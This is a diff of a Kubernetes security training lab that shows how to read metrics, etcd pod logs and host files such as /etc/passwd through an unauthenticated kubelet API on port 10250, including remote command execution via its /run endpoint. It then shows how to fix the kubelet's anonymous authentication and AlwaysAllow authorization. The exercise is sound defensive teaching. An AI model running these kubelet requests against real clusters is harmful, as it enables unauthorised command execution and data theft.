@@ -4,19 +4,17 @@
 
 Before fixing the kubelet we will try to get sensitive data via the kubelet.
 
-### Preparations
-
-```bash
-# exit the VM - for being in the Google Cloud Shell again
-exit
-
-# store the external IP of the worker node
-export IP=$(gcloud compute instances list --filter="name=kubernetes-security" --format json | jq '.[].networkInterfaces[].accessConfigs[].natIP' | tr -d \")
-```
-
 ### Getting sensitive data from the kubelet
 
 ```bash
+# exit the VM - for being in the Github Codespaces VM again
+exit
+
+# store the external IP of the worker node - you can get the public ip address of your training VM via the file ssh-config
+cat ssh-config
+export IP=<EXTERNAL-IP-OF-TRAINING-VM>
+echo $IP
+
 # getting metrics from the kubelet
 curl -k https://$IP:10250/metrics
 
@@ -27,25 +25,23 @@ curl -k https://$IP:10250/logs/pods/ | grep etcd
 curl -k https://$IP:10250/logs/pods/<ETCD_POD>/etcd/0.log
 
 # getting infos from the host
-kubectl exec -it my-suboptimal-pod -- cat /host/etc/passwd
 curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"
 ```
 
 ## Avoiding the Attack
 
-### SSH into the VM
+Detect the misconfiguration
 
 ```bash
-gcloud compute ssh root@kubernetes-security --zone europe-west3-a
+# ssh to the training vm again
+
+# take a loog at kubelets auth configurations
+cat /var/lib/kubelet/config.yaml | grep -A10 authentication
 ```
 
-### vi the kubelet config
+### Fix Kubelet Configuration
 
-```bash
-vi /var/lib/kubelet/config.yaml
-```
-
-### Fix Authentication
+Adapt the kubelet config according the following
 
 ```yaml
 authentication:
@@ -53,27 +49,23 @@ authentication:
     enabled: true # <= change to false
 ```
 
-### Fix Authorization
-
 ```yaml
 authorization:
   mode: AlwaysAllow # <= change to Webhook
 ```
 
-### Restart the kubelet and check the status
-
 ```bash
+# restart the kubelet
 systemctl restart kubelet
 
+# check if kubelet has started properly again
 systemctl status kubelet
-```
 
-### Verify kubelet is now safe again
-
-```bash
-# exit the VM - for being in the Google Cloud Shell again
+# exit the VM - for being in the Github Codespaces VM again
 exit
 
 # try to attack the kublet again - now you will get an `Unauthorized` response
 curl -k https://$IP:10250/metrics
+
+# ssh to the training vm again
 ```
